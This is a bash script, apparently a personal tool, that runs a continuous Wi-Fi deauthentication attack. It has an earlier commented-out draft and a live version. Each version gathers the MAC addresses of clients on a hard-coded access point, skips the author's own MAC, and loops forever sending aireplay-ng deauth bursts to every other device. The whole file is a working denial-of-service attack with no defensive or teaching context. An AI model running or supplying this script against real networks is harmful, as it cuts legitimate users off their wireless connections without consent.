# #!/bin/bash

# AP_BSSID="00:E6:3A:6E:D1:60"
# MY_MAC="d0:c5:d3:77:a6:4d"

# while true; do
#     DEVICES=$(tcpdump -i -v wlan0 -c 100 -n -e | grep -o -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})' | grep -v "$MY_MAC" | sort -u)
#     for DEVICE in $DEVICES; do
#         echo "Sending deauth packets to $DEVICE"
#         aireplay-ng --deauth 100 -a $AP_BSSID -c $DEVICE wlan0
#     done
#    sleep 1
# done


#!/bin/bash

AP_BSSID=00:E6:3A:6E:D1:60
MY_MAC=d0:c5:d3:77:a6:4d

while true; do
    for DEVICE in $(iw dev wlan0 station dump | awk -F' ' '{print $2}' | grep -v "$MY_MAC" | grep -v "$AP_BSSID"); do
        aireplay-ng --deauth 100 -a $AP_BSSID -c $DEVICE wlan0
    done
    sleep 1
done
